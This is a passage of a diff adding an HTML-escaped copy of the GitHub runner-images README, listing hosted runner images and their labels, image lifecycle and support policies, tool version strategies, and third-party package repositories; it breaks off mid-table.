+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#how-to-interact-with-the-repo&quot;&gt;How to Interact with the Repo&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#faqs&quot;&gt;FAQs&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;About&lt;/h2&gt; 
+&lt;p&gt;This repository contains the source code used to create the VM images for &lt;a href=&quot;https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners&quot;&gt;GitHub-hosted runners&lt;/a&gt; used for Actions, as well as for &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/hosted?view=azure-devops#use-a-microsoft-hosted-agent&quot;&gt;Microsoft-hosted agents&lt;/a&gt; used for Azure Pipelines. To build a VM machine from this repo&#39;s source, see the &lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/docs/create-image-and-azure-resources.md&quot;&gt;instructions&lt;/a&gt;.&lt;/p&gt; 
+&lt;h2&gt;Available Images&lt;/h2&gt; 
+&lt;table&gt; 
+ &lt;thead&gt; 
+  &lt;tr&gt; 
+   &lt;th&gt;Image&lt;/th&gt; 
+   &lt;th&gt;Architecture&lt;/th&gt; 
+   &lt;th&gt;YAML Label&lt;/th&gt; 
+   &lt;th&gt;Included Software&lt;/th&gt; 
+  &lt;/tr&gt; 
+ &lt;/thead&gt; 
+ &lt;tbody&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu 26.04 &lt;img src=&quot;https://img.shields.io/badge/preview-0969DA?style=flat&amp;amp;logoColor=white&quot; alt=&quot;preview&quot; /&gt;&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu26.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-26.04&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2604-Readme.md&quot;&gt;ubuntu-26.04&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu 26.04 Arm64 &lt;img src=&quot;https://img.shields.io/badge/preview-0969DA?style=flat&amp;amp;logoColor=white&quot; alt=&quot;preview&quot; /&gt;&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu26-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-26.04-arm&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2604-Arm64-Readme.md&quot;&gt;ubuntu-26.04-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu 24.04&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu24.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-latest&lt;/code&gt; or &lt;code&gt;ubuntu-24.04&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2404-Readme.md&quot;&gt;ubuntu-24.04&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu 24.04 Arm64&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu24-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-24.04-arm&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2404-Arm64-Readme.md&quot;&gt;ubuntu-24.04-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu 22.04&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu22.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-22.04&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2204-Readme.md&quot;&gt;ubuntu-22.04&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu 22.04 Arm64&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu22-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-22.04-arm&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2204-Arm64-Readme.md&quot;&gt;ubuntu-22.04-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Ubuntu Slim&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fubuntu-slim.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;ubuntu-slim&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu-slim/ubuntu-slim-Readme.md&quot;&gt;ubuntu-slim&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Xcode 27 &lt;a href=&quot;https://github.com/actions/runner-images/issues/14404&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/preview-0969DA?style=flat&amp;amp;logoColor=white&quot; alt=&quot;preview&quot; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fxcode-27.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;xcode-27&lt;/code&gt; or &lt;code&gt;xcode-27-xlarge&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/xcode-27-Readme.md&quot;&gt;xcode-27&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;macOS 26&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fmacos-26.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;macos-latest-large&lt;/code&gt;, &lt;code&gt;macos-26-intel&lt;/code&gt;, &lt;code&gt;macos-26-large&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-26-Readme.md&quot;&gt;macOS-26&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;macOS 26 Arm64&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fmacos-26-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;macos-latest&lt;/code&gt;, &lt;code&gt;macos-26&lt;/code&gt; or &lt;code&gt;macos-26-xlarge&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-26-arm64-Readme.md&quot;&gt;macOS-26-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;macOS 15&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fmacos-15.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;macos-15-large&lt;/code&gt;, or &lt;code&gt;macos-15-intel&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-15-Readme.md&quot;&gt;macOS-15&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;macOS 15 Arm64&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fmacos-15-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;macos-15&lt;/code&gt;, or &lt;code&gt;macos-15-xlarge&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-15-arm64-Readme.md&quot;&gt;macOS-15-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;macOS 14 &lt;a href=&quot;https://github.com/actions/runner-images/issues/13518&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/deprecated-E5534B?style=flat&amp;amp;logoColor=white&quot; alt=&quot;deprecated&quot; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fmacos-14.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;macos-14-large&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-14-Readme.md&quot;&gt;macOS-14&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;macOS 14 Arm64 &lt;a href=&quot;https://github.com/actions/runner-images/issues/13518&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/deprecated-E5534B?style=flat&amp;amp;logoColor=white&quot; alt=&quot;deprecated&quot; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fmacos-14-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;macos-14&lt;/code&gt; or &lt;code&gt;macos-14-xlarge&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-14-arm64-Readme.md&quot;&gt;macOS-14-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Windows Server 2025&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fwin25-vs2026.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;windows-latest&lt;/code&gt;, &lt;code&gt;windows-2025&lt;/code&gt;, or &lt;code&gt;windows-2025-vs2026&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows2025-VS2026-Readme.md&quot;&gt;windows-2025-vs2026&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Windows Server 2022&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fwin22.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;x64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;windows-2022&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows2022-Readme.md&quot;&gt;windows-2022&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Windows 11 Arm64&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fwin11-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;windows-11-arm&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows11-Arm64-Readme.md&quot;&gt;windows-11-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Windows 11 Arm64 with Visual Studio 2026 &lt;img src=&quot;https://img.shields.io/badge/preview-0969DA?style=flat&amp;amp;logoColor=white&quot; alt=&quot;preview&quot; /&gt;&lt;br /&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fhosted-runners-images-bot%2F79267492faab096d04cdd25ce7014cec%2Fraw%2Fwin11-vs2026-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
+   &lt;td&gt;arm64&lt;/td&gt; 
+   &lt;td&gt;&lt;code&gt;windows-11-vs2026-arm&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows11-VS2026-Arm64-Readme.md&quot;&gt;windows-11-vs2026-arm64&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+ &lt;/tbody&gt; 
+&lt;/table&gt; 
+&lt;h3&gt;Label scheme&lt;/h3&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;In general the &lt;code&gt;-latest&lt;/code&gt; label is used for the latest OS image version that is GA.&lt;/li&gt; 
+ &lt;li&gt;Before moving the &lt;code&gt;-latest&lt;/code&gt; label to a new OS version we will announce the change and give sufficient lead time for users to update their workflows.&lt;/li&gt; 
+ &lt;li&gt;The &lt;code&gt;-xlarge&lt;/code&gt; and &lt;code&gt;-large&lt;/code&gt; suffixes are unique to macOS images and are only available for GitHub Actions. Learn more about &lt;a href=&quot;https://docs.github.com/en/actions/reference/runners/larger-runners#available-macos-larger-runners-and-labels&quot;&gt;GitHub Actions larger runners&lt;/a&gt;.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Announcements&lt;/h2&gt; 
+&lt;p&gt;See notable upcoming changes by viewing issues with the &lt;a href=&quot;https://github.com/actions/runner-images/labels/Announcement&quot;&gt;Announcement&lt;/a&gt; label.&lt;/p&gt; 
+&lt;h2&gt;Image Definitions&lt;/h2&gt; 
+&lt;h3&gt;Beta&lt;/h3&gt; 
+&lt;p&gt;The purpose of a Beta is to collect feedback on an image before it is released to GA. The goal of a Beta is to identify and fix any potential issues that exist on that image. Images are updated on a weekly cadence. Any workflows that run on a beta image do not fall under the customer &lt;a href=&quot;https://github.com/customer-terms/github-online-services-sla&quot;&gt;SLA&lt;/a&gt; in place for Actions. Customers choosing to use Beta images are encouraged to provide feedback in the runner-images repo by creating an issue. A Beta may take on different availability, i.e. public vs private.&lt;/p&gt; 
+&lt;h3&gt;GA&lt;/h3&gt; 
+&lt;p&gt;A GA (General Availability) image has been through a Beta period and is deemed ready for general use. Images are updated on a weekly cadence. In order to be moved to GA the image must meet the following criteria:&lt;/p&gt; 
+&lt;ol&gt; 
+ &lt;li&gt;Has been through a Beta period (public or private)&lt;/li&gt; 
+ &lt;li&gt;Most major software we install on the image has a compatible version for the underlying OS and&lt;/li&gt; 
+ &lt;li&gt;All major bugs reported during the Beta period have been addressed.&lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;p&gt;This image type falls under the customer &lt;a href=&quot;https://github.com/customer-terms/github-online-services-sla&quot;&gt;SLA&lt;/a&gt; for actions. GA images are eventually deprecated according to our guidelines as we only support the latest 2 versions of an OS.&lt;/p&gt; 
+&lt;h4&gt;Latest Migration Process&lt;/h4&gt; 
+&lt;p&gt;GitHub Actions and Azure DevOps use the &lt;code&gt;-latest&lt;/code&gt; YAML label (ex: &lt;code&gt;ubuntu-latest&lt;/code&gt;, &lt;code&gt;windows-latest&lt;/code&gt;, and &lt;code&gt;macos-latest&lt;/code&gt;). These labels point towards the newest stable OS version available.&lt;/p&gt; 
+&lt;p&gt;The &lt;code&gt;-latest&lt;/code&gt; migration process is gradual and happens over 1-2 months in order to allow customers to adapt their workflows to the newest OS version. During this process, any workflow using the &lt;code&gt;-latest&lt;/code&gt; label, may see changes in the OS version in their workflows or pipelines. To avoid unwanted migration, users can specify a specific OS version in the yaml file (ex: macos-14, windows-2022, ubuntu-22.04).&lt;/p&gt; 
+&lt;h2&gt;Image Releases&lt;/h2&gt; 
+&lt;p&gt;&lt;em&gt;How to best follow along with changes&lt;/em&gt;&lt;/p&gt; 
+&lt;ol&gt; 
+ &lt;li&gt; &lt;p&gt;Find the latest releases for this repository &lt;a href=&quot;https://github.com/actions/runner-images/releases&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;Subscribe to the releases coming out of this repository, instructions &lt;a href=&quot;https://docs.github.com/en/account-and-profile/managing-subscriptions-and-notifications-on-github/setting-up-notifications/configuring-notifications#configuring-your-watch-settings-for-an-individual-repository&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;Upcoming changes: A pre-release is created when the deployment of an image has started. As soon as the deployment is finished, the pre-release is converted to a release. If you have subscribed to releases, you will get notified of pre-releases as well.&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;You can also track upcoming changes using the &lt;a href=&quot;https://github.com/actions/runner-images/labels/awaiting-deployment&quot;&gt;awaiting-deployment&lt;/a&gt; label.&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;For high impact changes, we will post these in advance to the GitHub Changelog on our &lt;a href=&quot;https://github.blog/changelog/&quot;&gt;blog&lt;/a&gt; and on &lt;a href=&quot;https://x.com/GHchangelog&quot;&gt;X&lt;/a&gt;.&lt;/p&gt; 
+  &lt;ul&gt; 
+   &lt;li&gt;Ex: breaking changes, GA or deprecation of images&lt;/li&gt; 
+  &lt;/ul&gt; &lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;p&gt;&lt;em&gt;Cadence&lt;/em&gt;&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;We typically deploy weekly updates to the software on the runner images.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Software and Image Support&lt;/h2&gt; 
+&lt;h3&gt;Support Policy&lt;/h3&gt; 
+&lt;ul&gt; 
+ &lt;li&gt; &lt;p&gt;Tools and versions will typically be removed 6 months after they are deprecated or have reached end-of-life&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;We support (at maximum) 2 GA images and 1 beta image at a time. We begin the deprecation process of the oldest image label once the newest OS image label has been released to GA.&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;The images generally contain the latest versions of packages installed except for Ubuntu LTS where we mostly rely on the Canonical-provided repositories.&lt;/p&gt; &lt;/li&gt; 
+ &lt;li&gt; &lt;p&gt;Popular tools can have several versions installed side-by-side with the following strategy:&lt;/p&gt; &lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;table&gt; 
+ &lt;thead&gt; 
+  &lt;tr&gt; 
+   &lt;th&gt;Tool name&lt;/th&gt; 
+   &lt;th&gt;Installation strategy&lt;/th&gt; 
+  &lt;/tr&gt; 
+ &lt;/thead&gt; 
+ &lt;tbody&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Docker images&lt;/td&gt; 
+   &lt;td&gt;not more than 3 latest LTS OS\tool versions. New images or new versions of current images are added using the standard tool request process&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Java&lt;/td&gt; 
+   &lt;td&gt;all LTS versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Node.js&lt;/td&gt; 
+   &lt;td&gt;3 latest LTS versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Go&lt;/td&gt; 
+   &lt;td&gt;3 latest minor versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Python &lt;br /&gt; Ruby&lt;/td&gt; 
+   &lt;td&gt;5 most popular &lt;code&gt;major.minor&lt;/code&gt; versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;PyPy&lt;/td&gt; 
+   &lt;td&gt;3 most popular &lt;code&gt;major.minor&lt;/code&gt; versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;.NET Core&lt;/td&gt; 
+   &lt;td&gt;2 latest LTS versions and 1 latest version. For each feature version only latest patch is installed. Note for &lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/docs/dotnet-ubuntu.md&quot;&gt;Ubuntu images see details.&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;GCC &lt;br /&gt; GNU Fortran &lt;br /&gt; Clang &lt;br /&gt; GNU C++&lt;/td&gt; 
+   &lt;td&gt;3 latest major versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Android NDK&lt;/td&gt; 
+   &lt;td&gt;1 latest non-LTS, 2 latest LTS versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Xcode&lt;/td&gt; 
+   &lt;td&gt;- only one major version of Xcode will be supported per macOS version &lt;br /&gt; - all minor versions of the supported major version will be available &lt;br /&gt; - beta and RC versions will be provided &quot;as-is&quot; in the latest available macOS image only no matter of beta/GA status of the image &lt;br /&gt; - when a new patch version is released, the previous patch version will be replaced&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;Xcode Platforms&lt;/td&gt; 
+   &lt;td&gt;- only three major.minor versions of platform tools and simulator runtimes will be available for installed Xcode, including beta/RC versions&lt;/td&gt; 
+  &lt;/tr&gt; 
+ &lt;/tbody&gt; 
+&lt;/table&gt; 
+&lt;h3&gt;Package managers usage&lt;/h3&gt; 
+&lt;p&gt;We use third-party package managers to install software during the image generation process. The table below lists the package managers and the software installed.&lt;/p&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-note&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-info mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Note&lt;/p&gt;
+ &lt;p&gt;Third-party repositories are re-evaluated every year to identify if they are still useful and secure.&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;table&gt; 
+ &lt;thead&gt; 
+  &lt;tr&gt; 
+   &lt;th style=&quot;text-align:left&quot;&gt;Operating system&lt;/th&gt; 
+   &lt;th style=&quot;text-align:center&quot;&gt;Package manager&lt;/th&gt; 
+   &lt;th style=&quot;text-align:right&quot;&gt;Third-party repos and packages&lt;/th&gt; 
+  &lt;/tr&gt; 
+ &lt;/thead&gt; 
+ &lt;tbody&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Ubuntu&lt;/td&gt; 
+   &lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://wiki.debian.org/Apt&quot;&gt;APT&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:right&quot;&gt;&lt;a href=&quot;https://download.docker.com/linux/ubuntu&quot;&gt;docker&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.adoptium.net/artifactory/deb/&quot;&gt;Eclipse-Temurin (Adoptium)&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.erlang-solutions.com/ubuntu&quot;&gt;Erlang&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://ppa.launchpad.net/mozillateam/ppa/ubuntu&quot;&gt;Firefox&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packagecloud.io/install/repositories/github/git-lfs&quot;&gt;git-lfs&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://launchpad.net/~git-core/+archive/ubuntu/ppa&quot;&gt;git&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.cloud.google.com/apt&quot;&gt;Google Cloud CLI&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://cli-assets.heroku.com/channels/stable/apt&quot;&gt;Heroku&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://dl.hhvm.com/ubuntu&quot;&gt;HHvm&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://repo.mongodb.org/apt/ubuntu&quot;&gt;MongoDB&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://download.mono-project.com/repo/ubuntu&quot;&gt;Mono&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.microsoft.com/repos/edge&quot;&gt;MS Edge&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://apt.postgresql.org/pub/repos/apt/&quot;&gt;PostgreSQL&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://cloud.r-project.org/bin/linux/ubuntu&quot;&gt;R&lt;/a&gt;&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;/td&gt; 
